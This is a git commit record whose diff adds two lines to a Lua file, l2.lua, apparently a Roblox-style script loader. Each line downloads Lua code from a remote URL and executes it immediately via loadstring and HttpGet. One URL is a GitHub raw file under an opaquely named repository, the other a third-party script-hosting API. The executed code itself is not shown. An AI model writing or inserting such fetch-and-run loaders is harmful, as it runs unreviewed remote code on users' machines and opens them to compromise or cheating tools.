4e59bbf922fd983e6026a3067f9adf5580ce3f1d
Birmap2314 <kolesnikov27092012@gmail.com>
2026-08-05 21:28:32 +0300

    Update l2.lua

--- l2.lua
+++ l2.lua
@@ -1,1 +1,2 @@
---
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Birmap2314/HUJFIUHSUIFDH/refs/heads/main/ProtectedByOAuth.lua"))()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8e1b9b7e43126aaed4aee893a070e932a12417aafe1ecda0dd7aeab4b8239755/download"))()
